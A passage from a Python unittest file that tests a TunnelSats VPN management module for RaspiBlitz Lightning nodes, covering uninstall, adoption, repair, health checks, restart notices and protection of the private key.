        self.assertEqual((3, "E_NOT_ELIGIBLE"), (doc["exit_code"], doc["errors"][0]["code"]))
        self.assertEqual([], self.fake.http_calls)

    def test_invalid_file_names_no_values(self):
        bad = self.write("bad.conf", fixture("import", "website.conf").replace("# Port Forwarding: 24556\n", ""))
        doc = self.run_verb("import", "--file", bad)
        self.assertEqual((2, "E_CONFIG_NO_PORT"), (doc["exit_code"], doc["errors"][0]["code"]))
        doc = self.run_verb("import", "--file", self.path("missing.conf"))
        self.assertEqual((2, "E_FILE"), (doc["exit_code"], doc["errors"][0]["code"]))


# ------------------------------------------------------------------------------------------
# REMOVE, ADOPT, REPAIR
# ------------------------------------------------------------------------------------------

class TestTemplates(unittest.TestCase):
    def test_guard_line_is_the_line_the_unit_templates_write(self):
        with open(os.path.join(REPO, "home.admin", "assets", "lnd.service")) as handle:
            self.assertIn(mod.guard_line("lnd"), handle.read().splitlines())
        with open(os.path.join(REPO, "home.admin", "config.scripts", "cl.install-service.sh")) as handle:
            lines = [line for line in handle.read().splitlines() if line.startswith("ExecStartPre=+")]
        self.assertEqual(1, len(lines))
        rendered = lines[0].replace("$CHAIN", "mainnet").replace("${netprefix}", "")
        # nothing else in the line for bash (echo "...") or systemd to expand
        self.assertFalse(any(ch in rendered for ch in "$%\\`"), rendered)
        self.assertEqual(mod.guard_line("cl"), rendered)
        for impl in mod.IMPLS:
            self.assertIn("if [ -x %s ]; then exec %s guard %s mainnet; fi;" % (mod.ITS, mod.ITS, impl),
                          mod.guard_line(impl))
            self.assertTrue(mod.guard_line(impl).endswith(
                "echo %s= > /run/tunnelsats/hybrid-%s.env'" % (mod.VARS[impl], mod.BASES[impl])))


class TestRemove(ModuleTestCase):
    def setUp(self):
        super().setUp()
        self.store()
        self.activate_conf()
        self.fake.its["detect"] = [(0, fixture_json("tool", "detect_managed.json")),
                                   (0, fixture_json("tool", "detect_none.json"))]
        self.fake.its["block-status"] = (0, {"state": "absent"})
        self.write("run/tunnelsats/hybrid-lnd.env", "TUNNELSATS_LND_ARGS=%s\n" % " ".join(LND_FLAGS))
        # after the restart REMOVE triggers: outside the slice, without flags
        self.fake.units["lnd.service"]["ControlGroup"] = "/system.slice/lnd.service"
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])

    def test_disabled_unit_is_reenabled_and_started_after_the_own_audit(self):
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual(0, doc["exit_code"], doc)
        self.assertTrue(doc["removed"] and doc["ln_reenabled"] and doc["ln_started"] and doc["ln_was_active"])
        f = self.fake
        off = f.calls.index([mod.BLITZ_CONF, "set", "tunnelsats", "off"])
        uninstall = f.calls.index([mod.ITS, "uninstall", "--json"])
        audit = f.calls.index([mod.ITS, "audit", "lnd", "--repair", "--json"])
        enable = f.calls.index(["systemctl", "enable", "lnd.service"])
        start = f.calls.index(["systemctl", "start", "lnd.service"])
        self.assertTrue(off < f.calls.index([mod.ITS, "block-remove", "--json"]) < uninstall < audit < enable < start)
        self.assertIn([mod.ITS, "tick-timer", "off"], f.calls)
        self.assertFalse(os.path.exists(self.path("run/tunnelsats/hybrid-lnd.env")))
        self.assertEqual([], doc["artifacts"])
        self.assertTrue(os.path.exists(self.path(mod.CONF_FILE)))

    def test_incomplete_removal_keeps_lightning_stopped(self):
        self.fake.its["uninstall"] = (1, fixture_json("tool", "uninstall_incomplete.json"))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual(1, doc["exit_code"])
        self.assertEqual(["nft table inet tunnelsats"], doc["remaining"])
        self.assertEqual([], self.fake.calls_of("systemctl", "enable"))
        self.assertEqual([], self.fake.calls_of("systemctl", "start"))

    @staticmethod
    def audit(status, reason=None, lines=(), keys=()):
        return {"contract": 1, "command": "its.audit", "status": status, "reason": reason, "keys": list(keys),
                "lines": list(lines), "eligible": True}

    def assert_stays_stopped(self, doc):
        self.assertEqual((1, "E_AT_REST_UNREPAIRABLE"), (doc["exit_code"], doc["errors"][0]["code"]), doc)
        self.assertEqual([], self.fake.calls_of("systemctl", "enable"))
        self.assertEqual([], self.fake.calls_of("systemctl", "start"))
        self.assertFalse(doc["removed"] or doc["ln_reenabled"] or doc["ln_started"])

    def test_unrepairable_at_rest_audit_keeps_lightning_stopped_and_names_the_lines(self):
        line = "/mnt/hdd/app-data/lnd/lnd.conf:8:externalhosts=de2.tunnelsats.com:24556"
        self.fake.its["audit lnd --repair"] = (1, self.audit("unrepairable", "backup_failed", [line], ["externalhosts"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stays_stopped(doc)
        action = doc["action_required"]
        self.assertEqual(("node_config_clearnet", [line], "systemctl enable --now lnd.service"),
                         (action["reason"], action["lines"], action["then"]))
        self.assertIn("backup_failed", action["detail"])
        self.assertIn("lnd.service stays stopped and disabled", doc["errors"][0]["message"])
        self.assertIn("then run: sudo systemctl enable --now lnd.service", doc["errors"][0]["message"])
        text = mod.result_text(doc)
        self.assertIn(line, text)
        self.assertIn("Then run: sudo systemctl enable --now lnd.service", text)
        self.assertTrue(os.path.exists(self.path(mod.CONF_FILE)))

    def test_an_at_rest_audit_without_answer_keeps_lightning_stopped(self):
        self.fake.its["audit lnd --repair"] = (124, "")
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stays_stopped(doc)
        self.assertIsNone(doc["at_rest"])
        self.assertEqual(("node_config_unknown", []), (doc["action_required"]["reason"], doc["action_required"]["lines"]))
        self.assertIn("did not answer", doc["action_required"]["detail"])

    def test_a_running_unit_gets_the_read_only_check(self):
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        uninstall.update({"ln_disabled": False, "ln_started": True, "node_config": "clean", "action_required": None})
        self.fake.its["uninstall"] = (0, uninstall)
        self.fake.its["audit lnd --repair"] = (1, self.audit("not_checked"))
        line = "/mnt/hdd/app-data/lnd/lnd.conf:27:tor.skip-proxy-for-clearnet-targets=true"
        self.fake.its["audit lnd"] = (4, self.audit("drift", None, [line], ["tor.skip-proxy-for-clearnet-targets"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((1, "drift"), (doc["exit_code"], doc["at_rest"]))
        self.assertEqual(([line], None), (doc["action_required"]["lines"], doc["action_required"]["then"]))
        self.assertIn([mod.ITS, "audit", "lnd", "--json"], self.fake.calls)
        self.assertEqual([], self.fake.calls_of("systemctl", "enable") + self.fake.calls_of("systemctl", "start"))

    def test_a_running_unit_with_a_clean_config_completes(self):
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        uninstall.update({"ln_disabled": False, "ln_started": True, "node_config": "clean", "action_required": None})
        self.fake.its["uninstall"] = (0, uninstall)
        self.fake.its["audit lnd --repair"] = (1, self.audit("not_checked"))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, "clean", True), (doc["exit_code"], doc["at_rest"], doc["removed"]), doc)
        self.assertEqual([], self.fake.calls_of("systemctl", "enable") + self.fake.calls_of("systemctl", "start"))

    def test_the_other_implementation_is_checked_and_never_edited(self):
        line = "/home/bitcoin/.lightning/config:7:bind-addr=0.0.0.0:9735"
        self.fake.its["audit cl"] = (4, self.audit("drift", None, [line], ["bind-addr"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((1, "E_AT_REST_UNREPAIRABLE"), (doc["exit_code"], doc["errors"][0]["code"]))
        # the tunneled unit itself is Tor-only at rest: it is enabled and started again
        self.assertTrue(doc["ln_reenabled"] and doc["ln_started"])
        self.assertEqual(([line], None), (doc["action_required"]["lines"], doc["action_required"]["then"]))
        self.assertIn("lightningd.service", doc["errors"][0]["message"])
        self.assertEqual([], self.fake.calls_of(mod.ITS, "audit", "cl", "--repair"))

    def test_the_unit_of_the_uninstall_document_decides_which_config_is_audited(self):
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        uninstall["unit"] = "lightningd.service"
        self.fake.its["uninstall"] = (0, uninstall)
        line = "/home/bitcoin/.lightning/extra.conf:2:announce-addr=203.0.113.5:9735"
        self.fake.its["audit cl --repair"] = (1, self.audit("unrepairable", "include_hybrid", [line], ["announce-addr"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stays_stopped(doc)
        self.assertIn([mod.ITS, "audit", "cl", "--repair", "--json"], self.fake.calls)
        self.assertEqual([], self.fake.calls_of(mod.ITS, "audit", "lnd", "--repair"))
        self.assertEqual(([line], "systemctl enable --now lightningd.service"),
                         (doc["action_required"]["lines"], doc["action_required"]["then"]))

    def test_purge_deletes_the_stored_subscription(self):
        doc = self.run_verb("uninstall", "--yes", "--purge")
        self.assertTrue(doc["purged"])
        self.assertFalse(os.path.exists(self.path(mod.STATE_DIR)))

    def test_adopted_legacy_is_forgotten_without_touching_the_system(self):
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.store(mode="adopted_legacy", legacy_kind="legacy_v3_post_204")
        self.fake.calls.clear()
        doc = self.run_verb("uninstall", "--yes")
        self.assertTrue(doc["forgotten"])
        self.assertEqual([], [c for c in self.fake.calls if c[0] in (mod.ITS, mod.BLITZ_CONF, "systemctl")])
        self.assertFalse(os.path.exists(self.path(mod.STATE_DIR)))

    def test_needs_confirmation_and_something_to_remove(self):
        self.assertEqual(2, self.run_verb("uninstall")["exit_code"])
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.fake.conf_set("tunnelsats", "off")
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_none.json"))
        self.assertEqual(3, self.run_verb("uninstall", "--yes")["exit_code"])


class TestAdopt(ModuleTestCase):
    def snapshot(self):
        out = {}
        for base, _dirs, files in os.walk(self.root):
            rel = os.path.relpath(base, self.root)
            if rel.startswith(("mnt/hdd/app-data/tunnelsats", "run/tunnelsats")):
                continue
            for name in files:
                with open(os.path.join(base, name), "rb") as handle:
                    out[os.path.join(rel, name)] = hashlib.sha256(handle.read()).hexdigest()
        return out

    def test_adopt_step1_stores_the_subscription_and_changes_nothing_else(self):
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        legacy = fixture("import", "website.conf").replace("DNS = 8.8.8.8", "DNS = 8.8.8.8\nPostUp = /etc/wireguard/tunnelsats-route-guard.sh")
        self.write("etc/wireguard/tunnelsatsv2.conf", legacy)
        self.write("mnt/hdd/app-data/custom-installs.sh",
                   "#!/bin/bash\nsudo wg-quick up tunnelsatsv2\n# >>> TunnelSats block (managed by internet.tunnelsats.sh, do not edit) >>>\n"
                   "echo tunnelsats inside\n# <<< TunnelSats block <<<\necho tunnelsats outside\n")
        before = self.snapshot()
        doc = self.run_verb("adopt")
        self.assertEqual(0, doc["exit_code"], doc)
        self.assertTrue(doc["adopted"])
        self.assertEqual("legacy_v3_post_204", doc["legacy_kind"])
        self.assertEqual([2, 6], [entry["line"] for entry in doc["custom_installs_lines"]])
        self.assertFalse(doc["upgrade_available"])
        self.assertEqual(before, self.snapshot())
        self.assertEqual([], [c for c in self.fake.calls if c[0] in (mod.BLITZ_CONF, "systemctl")])
        self.assertEqual([[mod.ITS, "detect", "--json"]], self.fake.calls_of(mod.ITS))
        self.assertEqual("adopted_legacy", self.read_json(mod.STATE_FILE)["mode"])
        self.assertNotIn(b"PostUp", self.read_bytes(mod.CONF_FILE))
        self.assertEqual("unsafe", self.run_verb("check")["verdict"])

    def test_refusals(self):
        self.assertEqual((14, "E_UPGRADE_UNAVAILABLE"), tuple(
            (d["exit_code"], d["errors"][0]["code"]) for d in [self.run_verb("adopt", "--upgrade", "--yes")])[0])
        self.assertEqual(3, self.run_verb("adopt")["exit_code"])
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_managed.json"))
        self.assertEqual(14, self.run_verb("adopt")["exit_code"])
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        self.write("etc/wireguard/tunnelsatsv2.conf",
                   fixture("import", "website.conf").replace("de2.tunnelsats.com:51820", "203.0.113.9:51820"))
        self.assertEqual("E_ENDPOINT_NOT_ALLOWED", self.run_verb("adopt")["errors"][0]["code"])


class TestRepair(ModuleTestCase):
    def test_older_tool_is_reinstalled_and_lightning_started_again(self):
        self.store()
        self.activate_conf()
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_managed.json"))
        self.fake.its["status"] = (0, {"tool_hash": "accepted_older"})
        doc = self.run_verb("repair", "--yes")
        self.assertEqual(["uninstall", "reenable", "install"], doc["actions"][:3])
        self.assertLess(self.fake.calls.index([mod.ITS, "uninstall", "--json"]),
                        self.fake.index_of(mod.ITS, "install"))

    def test_healthy_install_only_reapplies_block_and_timer(self):
        self.store()
        self.activate_conf()
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_managed.json"))
        doc = self.run_verb("repair", "--yes")
        self.assertEqual(["block", "tick_timer"], doc["actions"])
        self.assertEqual(-1, self.fake.index_of(mod.ITS, "uninstall"))

    def test_refusals(self):
        self.assertEqual(3, self.run_verb("repair", "--yes")["exit_code"])
        self.store(mode="adopted_legacy")
        self.assertEqual(14, self.run_verb("repair", "--yes")["exit_code"])

    def test_tor_off_is_refused_before_anything_changes(self):
        self.store()
        self.fake.conf_set("runBehindTor", "off")
        self.fake.calls.clear()
        doc = self.run_verb("repair", "--yes")
        self.assertEqual((14, "E_TOR_REQUIRED", "refused"),
                         (doc["exit_code"], doc["errors"][0]["code"], doc["errors"][0]["class"]))
        self.assertIn("SETTINGS", doc["errors"][0]["message"])
        self.assertEqual([], [c for c in self.fake.calls if c[0] in (mod.ITS, mod.BLITZ_CONF, "systemctl")])
        self.assertNotIn("tunnelsats=on", self.read_bytes(mod.RB_CONF).decode())


# ------------------------------------------------------------------------------------------
# CHECK
# ------------------------------------------------------------------------------------------

class TestCheck(ModuleTestCase):
    def setUp(self):
        super().setUp()
        self.store()
        self.activate_conf()
        self.record()

    def ids(self, doc, result="fail"):
        return [c["id"] for c in doc["checks"] if c["result"] == result]

    def test_protected_when_everything_holds(self):
        doc = self.run_verb("check")
        self.assertEqual(("protected", 0), (doc["verdict"], doc["exit_code"]), self.ids(doc))
        self.assertEqual("hybrid", doc["guard"]["decision"])
        self.assertEqual("protected", self.read_json(mod.STATE_FILE)["last_check"]["verdict"])

    def test_flags_without_a_hybrid_decision_are_unsafe(self):
        self.record(decision="tor-only", reason="verify_unsafe")
        doc = self.run_verb("check")
        self.assertEqual("unsafe", doc["verdict"])
        self.assertIn("ln_runtime_flags", self.ids(doc))

    def test_decision_of_another_start_is_degraded(self):
        self.record(invocation="f" * 32)
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])
        self.fake.getinfo = {"uris": ["0280a@exampleonion.onion:9735"]}
        doc = self.run_verb("check")
        self.assertEqual("degraded", doc["verdict"])
        self.assertIn("ln_runtime_flags", self.ids(doc))

    def test_tunnel_down_is_degraded_with_clearnet_blocked(self):
        self.fake.its["verify"] = (5, fixture_json("verify", "activating_tunnel_down.json"))
        doc = self.run_verb("check")
        self.assertEqual(("degraded", 5), (doc["verdict"], doc["exit_code"]))
        self.assertTrue(doc["clearnet_blocked"])

    def test_foreign_clearnet_address_is_unsafe(self):
        self.fake.getinfo = {"uris": ["0280a@1.2.3.4:24556", "0280a@exampleonion.onion:9735",
                                      "0280a@198.51.100.7:9735"]}
        doc = self.run_verb("check")
        self.assertEqual("unsafe", doc["verdict"])
        self.assertIn("announce", self.ids(doc))

    def test_lnd_announces_the_vpn_address_resolved_at_the_start_or_now(self):
        verify = fixture_json("verify", "protected.json")
        cases = [
            # record without the address (older guard), verify knows it now
            (None, "1.2.3.4", ["0280a@1.2.3.4:24556"], "protected"),
            # the endpoint moved since the start: both addresses count
            ("5.6.7.8", "1.2.3.4", ["0280a@5.6.7.8:24556"], "protected"),
            ("5.6.7.8", "1.2.3.4", ["0280a@1.2.3.4:24556"], "protected"),
            # DNS fails now: the address of the start still counts
            ("1.2.3.4", None, ["0280a@1.2.3.4:24556"], "protected"),
            # any other address, the VPN address on another port, a private address: unsafe
            ("1.2.3.4", "1.2.3.4", ["0280a@9.9.9.9:24556"], "unsafe"),
            ("1.2.3.4", "1.2.3.4", ["0280a@1.2.3.4:9735"], "unsafe"),
            ("1.2.3.4", "10.0.0.1", ["0280a@10.0.0.1:24556"], "unsafe"),
        ]
        for recorded, live, uris, verdict in cases:
            with self.subTest(recorded=recorded, live=live, uris=uris):
                self.record(ipv4=recorded)
                verify["endpoint"]["ipv4"] = live
                self.fake.its["verify"] = (0, verify)
                self.fake.getinfo = {"uris": uris + ["0280a@exampleonion.onion:9735"]}
                doc = self.run_verb("check")
                self.assertEqual(verdict, doc["verdict"], self.ids(doc))
                self.assertEqual(verdict == "unsafe", "announce" in self.ids(doc))

    def test_restart_needed_after_a_tor_only_start(self):
        self.record(decision="tor-only", reason="emergency_block")
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])
        self.fake.getinfo = {"uris": ["0280a@exampleonion.onion:9735"]}
        doc = self.run_verb("check")
        self.assertTrue(doc["restart_needed"])
        self.assertEqual("degraded", doc["verdict"])
        self.assertIn([mod.ITS, "guard", "lnd", "mainnet", "--dry-run", "--json"], self.fake.calls)

    def test_cln_daemon_below_sh_is_found_in_proc(self):
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.store(impl="cl")
        self.activate_conf("cl")
        self.fake.units["lightningd.service"].update({"ActiveState": "active", "InvocationID": INVOCATION,
                                                      "MainPID": "5000"})
        self.fake.units["lnd.service"]["ActiveState"] = "inactive"
        self.fake.its["verify"] = (0, fixture_json("verify", "cln_protected.json"))
        self.fake.its["audit cl"] = (0, {"status": "clean", "eligible": True, "keys": []})
        self.fake.its["audit lnd"] = (1, {"status": "unrepairable", "reason": "config_missing"})
        self.record(base="lightningd", ipv4="1.2.3.4")
        os.unlink(self.path("run/tunnelsats/guard-lnd.json"))
        self.cmdline(5000, ["/bin/sh", "-c", "/usr/local/bin/lightningd --conf=x $TUNNELSATS_CLN_ARGS"])
        self.cmdline(5001, ["/usr/local/bin/lightningd", "--conf=/home/bitcoin/.lightning/config",
                            "--bind-addr=0.0.0.0:9735", "--announce-addr=1.2.3.4:24556", "--always-use-proxy=false",
                            "--announce-addr-discovered=false"], ppid=5000)
        self.fake.getinfo = {"address": [{"type": "ipv4", "address": "1.2.3.4", "port": 24556},
                                         {"type": "torv3", "address": "exampleonion.onion", "port": 9736}],
                             "binding": [{"address": "127.0.0.1", "port": 9736}, {"address": "0.0.0.0", "port": 9735}]}
        doc = self.run_verb("check")
        self.assertEqual("protected", doc["verdict"], self.ids(doc))

    def test_dataplane_not_installed_is_degraded_tor_only(self):
        self.fake.its["verify"] = (3, fixture_json("verify", "not_installed.json"))
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])
        self.record(decision="tor-only", reason="not_installed")
        self.fake.getinfo = {"uris": ["0280a@exampleonion.onion:9735"]}
        self.fake.its["guard"] = (0, {"decision": "tor-only", "reason": "not_installed"})
        doc = self.run_verb("check")
        self.assertEqual("degraded", doc["verdict"], self.ids(doc))

    def test_not_configured_and_tunnelsats_off(self):
        self.fake.conf_set("tunnelsats", "off")
        self.assertEqual(3, self.run_verb("check")["exit_code"])
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.fake.its["verify --no-probe"] = (9, fixture_json("verify", "unmanaged.json"))
        doc = self.run_verb("check")
        self.assertEqual(("unsafe", ["legacy_lifecycle"]), (doc["verdict"], doc["reasons"]))


# ------------------------------------------------------------------------------------------
# tick (the restart notice)
# ------------------------------------------------------------------------------------------

class TestTick(ModuleTestCase):
    def setUp(self):
        super().setUp()
        self.store()
        self.activate_conf()
        self.record(decision="tor-only", reason="emergency_block")
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])

    def notifies(self):
        return self.fake.calls_of(mod.NOTIFY, "send")

    def test_one_notification_per_start_only_when_notifications_are_on(self):
        self.fake.conf_set("notify", "on")
        doc = self.run_verb("tick")
        self.assertTrue(doc["restart_needed"])
        self.assertEqual([{"event": "restart_needed", "outcome": "handed_off", "attempt": 1}], doc["notifications"])
        self.assertEqual([[mod.NOTIFY, "send", mod.RESTART_MESSAGE]], self.notifies())
        self.assertEqual([], self.run_verb("tick")["notifications"])
        self.assertEqual(1, len(self.notifies()))
        self.assertIn("notify event=restart_needed outcome=handed_off attempt=1", self.logs)
        self.fake.units["lnd.service"]["InvocationID"] = "e" * 32
        self.record(decision="tor-only", reason="emergency_block", invocation="e" * 32)
        self.assertEqual("handed_off", self.run_verb("tick")["notifications"][0]["outcome"])
        self.assertEqual(2, len(self.notifies()))

    def test_notifications_off_never_calls_blitz_notify(self):
        doc = self.run_verb("tick")
        self.assertEqual("skipped_disabled", doc["notifications"][0]["outcome"])
        self.assertEqual([], self.notifies())
        self.assertEqual([], self.run_verb("tick")["notifications"])

    def test_a_failed_notification_is_retried_at_most_twice(self):
        self.fake.conf_set("notify", "on")
        self.fake.notify_rc = 1
        outcomes = [(d["notifications"] or [{}])[0].get("outcome") for d in
                    [self.run_verb("tick") for _ in range(4)]]
        self.assertEqual(["failed", "failed", "dropped", None], outcomes)
        self.assertEqual(3, len(self.notifies()))

    def test_conditions(self):
        self.fake.units["lnd.service"]["InvocationID"] = "a" * 32
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.fake.units["lnd.service"]["InvocationID"] = INVOCATION
        self.record(decision="tor-only", reason="not_eligible:nat")
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.record(decision="hybrid", reason="ok")
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.assertEqual([], [c for c in self.fake.calls if c[:2] == [mod.ITS, "guard"]])
        self.record(decision="tor-only", reason="verify_timeout")
        self.fake.its["guard"] = (0, {"decision": "tor-only", "reason": "emergency_block"})
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.fake.conf_set("tunnelsats", "off")
        calls = len(self.fake.calls)
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.assertEqual(calls, len(self.fake.calls))

    def test_cln_restart_needed_only_with_a_confirmed_address(self):
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.store(impl="cl")
        self.activate_conf("cl")
        self.fake.units["lightningd.service"].update({"ActiveState": "active", "InvocationID": INVOCATION})
        self.record(decision="hybrid", reason="announce_unconfirmed", base="lightningd")
        self.fake.its["guard"] = (0, {"decision": "hybrid", "reason": "announce_unconfirmed"})
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.fake.its["guard"] = (0, {"decision": "hybrid", "reason": "ok"})
        self.assertTrue(self.run_verb("tick")["restart_needed"])

    @unittest.skipUnless(shutil.which("jq") and shutil.which("bash"), "needs bash and jq")
    def test_the_decision_comes_from_the_real_bash_guard(self):
        self.fake.real_guard = True
        doc = self.run_verb("tick")
        self.assertTrue(doc["restart_needed"])
        self.assertFalse(os.path.exists(self.path("run/tunnelsats/hybrid-lnd.env")))
        self.fake.conf_set("runBehindTor", "off")
        self.fake.conf_set("tunnelsats", "on")
        self.assertFalse(self.run_verb("tick")["restart_needed"])


# ------------------------------------------------------------------------------------------
# status, subscriptions-list, CLI, custody
# ------------------------------------------------------------------------------------------

class TestStatus(ModuleTestCase):
    def test_cached_refresh_and_port_change(self):
        self.store()
        self.activate_conf()
        doc = self.run_verb("status", "--cached")
        self.assertEqual(("skipped", []), (doc["sync"]["outcome"], self.fake.http_calls))
        self.assertEqual((24556, "de2.tunnelsats.com", "enabled", 0), (doc["vpn_port"], doc["server_domain"],
                                                                      doc["peer_status"], doc["resets_this_month"]))
        self.assertEqual(30, doc["tunnel"]["handshake_age_s"])
        self.assertIsNone(doc["notify_state"])
        self.fake.http_responses = [(200, {}, fixture("api", "status_port_changed.json").encode())]
        doc = self.run_verb("status", "--refresh")
        self.assertEqual("confirmed", doc["sync"]["outcome"])
        self.assertEqual("server port changed: REPAIR (restarts Lightning)", doc["action"])
        self.fake.http_responses = [OSError("down")]
        doc = self.run_verb("status", "--refresh")
        self.assertEqual(("failed", 0), (doc["sync"]["outcome"], doc["exit_code"]))
        self.assertEqual(24600, self.read_json(mod.STATE_FILE)["api"]["data"]["vpn_port"])

    def test_stale_cache_refreshes_and_invalid_answers_exit_12(self):
        self.store()
        state = self.read_json(mod.STATE_FILE)
        state["api"]["checked_at"] = "2026-10-14T05:00:00Z"
        mod.save_state(self.deps, state)
        self.fake.http_responses = [(200, {}, b'{"expiry": "never"}')]
        doc = self.run_verb("status")
        self.assertEqual(("invalid", 12), (doc["sync"]["outcome"], doc["exit_code"]))

    def test_not_configured(self):
        self.assertEqual(3, self.run_verb("status")["exit_code"])


class TestSubscriptionsList(ModuleTestCase):
    def test_local_state_only(self):
        self.assertEqual([], self.run_verb("subscriptions-list")["subscriptions"])
        self.store()
        self.activate_conf()
        item = self.run_verb("subscriptions-list")["subscriptions"][0]
        self.assertEqual({"type": "tunnelsats-v1", "id": hashlib.sha256(ALICE_PUB.encode()).hexdigest()[:8],
                          "name": "de2.tunnelsats.com", "active": True, "warning": "",
                          "description": "WireGuard VPN for Lightning clearnet via de2.tunnelsats.com, expires 2026-12-01",
                          "time_created": "2026-10-14T12:00:00Z"}, item)
        self.assertEqual([], self.fake.http_calls)


class TestCli(ModuleTestCase):
    def test_not_root_usage_and_internal_errors_give_one_document(self):
        self.deps.is_root = lambda: False
        self.assertEqual("E_NOT_ROOT", self.run_verb("status")["errors"][0]["code"])
        self.deps.is_root = lambda: True
        self.assertEqual((2, "E_USAGE"), tuple([(d["exit_code"], d["errors"][0]["code"])
                                                for d in [self.run_verb("import")]][0]))
        self.assertEqual("E_USAGE", self.run_verb("frobnicate")["errors"][0]["code"])

        def explode(argv, timeout=60, interactive=False):
            raise RuntimeError("secret detail " + ALICE_PUB)

        self.store()
        self.activate_conf()
        self.deps.run = explode
        doc = self.run_verb("check")
        self.assertEqual(("E_INTERNAL", "unexpected RuntimeError"), (doc["errors"][0]["code"], doc["errors"][0]["message"]))
        self.assertFalse(any("secret detail" in line for line in self.logs))


class TestCustody(ModuleTestCase):
    def test_private_files_use_o_excl_and_0600(self):
        seen = []
        real_open = os.open

        def recording_open(path, flags, mode=0o777, *args, **kwargs):
            if os.path.basename(str(path)).startswith("."):
                seen.append((path, flags, mode))
            return real_open(path, flags, mode, *args, **kwargs)

        with mock.patch.object(mod.os, "open", recording_open):
            self.run_verb("import", "--file", self.import_file)
        temps = [s for s in seen if mod.STATE_DIR.lstrip("/") in str(s[0])]
        self.assertTrue(temps)
        for _path, flags, mode in temps:
            self.assertTrue(flags & os.O_EXCL and flags & os.O_CREAT)
            self.assertEqual(0o600, mode)

    def test_the_private_key_never_leaves_the_config_file(self):
        self.fake.conf_set("notify", "on")
        self.run_verb("import", "--file", self.import_file)
        for verb in (["status", "--refresh"], ["check"], ["subscriptions-list"], ["detect"], ["tick"],
                     ["repair", "--yes"]):
            self.run_verb(*verb)
        for directory, _dirs, files in os.walk(self.root):
            for name in files:
                path = os.path.join(directory, name)
                if path == self.path(mod.CONF_FILE) or "/proc/" in path:
                    continue
                with open(path, "rb") as handle:
                    self.assertNotIn(ALICE_PRIV.encode(), handle.read(), path)
        self.assertTrue(all(ALICE_PRIV not in json.dumps(d) for d in self.docs))


if __name__ == "__main__":
    unittest.main()
